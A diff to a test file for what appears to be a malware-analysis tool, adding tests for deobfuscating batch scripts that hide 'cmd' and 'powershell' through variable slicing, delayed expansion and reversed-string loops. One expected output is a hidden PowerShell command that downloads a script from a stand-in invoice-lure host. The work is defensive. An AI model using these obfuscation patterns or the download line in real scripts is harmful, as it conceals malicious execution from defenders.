@@ -591,3 +591,40 @@ def test_vbs_xor_loader_sample_end_to_end(client) -> None:
     iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
     assert "http://invoice-cdn.example/Factura_2024-0613.pdf" in iocs
     assert any("198.51.100.23" in v for v in iocs)
+
+
+_COMSPEC = "C:\\WINDOWS\\system32\\cmd.exe"
+
+
+@pytest.mark.parametrize("src,want", [
+    ("".join(f"%COMSPEC:~{_COMSPEC.rindex(c) - len(_COMSPEC)},1%" for c in "cmd") + " /c echo hi", "cmd /c echo hi"),
+    ('cmd /V:ON /C "set a=pXwershell&&call %a:X=o% -c hi"', "call powershell -c hi"),
+    ('setlocal EnableDelayedExpansion\nset s=llehsrewop\nfor /L %%i in (9,-1,0) do set "r=!r!!s:~%%i,1!"\n!r! -c hi',
+     "\npowershell -c hi"),
+    ('setlocal EnableDelayedExpansion\nset c=lrhweops\nfor %%i in (6,5,3,4,1,7,2,4,0,0) do set r=!r!!c:~%%i,1!\n!r! -c hi',
+     "\npowershell -c hi"),
+    ("set x=abcpowershell\ncall set y=%%x:~3,10%%\n%y% -c hi", "\npowershell -c hi"),
+    ('p""ower""shell -c hi', "powershell -c hi"),
+    ("set v=xyzpowershell\n%v:*z=% -c hi", "\npowershell -c hi"),
+])
+def test_batch_dosfuscation(src: str, want: str) -> None:
+    from docutracex.parsers.bat_deobf import deobfuscate
+    assert want in deobfuscate(src)["code"]
+
+
+def test_batch_builtin_vars_only_with_modifiers() -> None:
+    from docutracex.parsers.bat_deobf import deobfuscate
+    assert deobfuscate("copy a.exe %PUBLIC%\\a.exe")["changed"] is False
+    # A variable the script sets itself wins over the built-in value.
+    assert "XY" in deobfuscate("set public=XYZ\necho %public:~0,2%")["code"]
+
+
+def test_dosfuscation_sample_end_to_end(client) -> None:
+    import json
+    _, res = _analyze(client, "sample_dosfuscation.bat", _ms().dosfuscation_bat())
+    bat = json.loads((res / "batch.json").read_text())
+    sc = bat["scripts"][0]
+    assert {"for-loop decode", "builtin-var slicing"} <= set(sc["deob_methods"])
+    assert "call powershell -w hidden -c iwr http://invoice-files.example/Factura_2024-0613.ps1" in sc["code"]
+    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
+    assert "http://invoice-files.example/Factura_2024-0613.ps1" in iocs
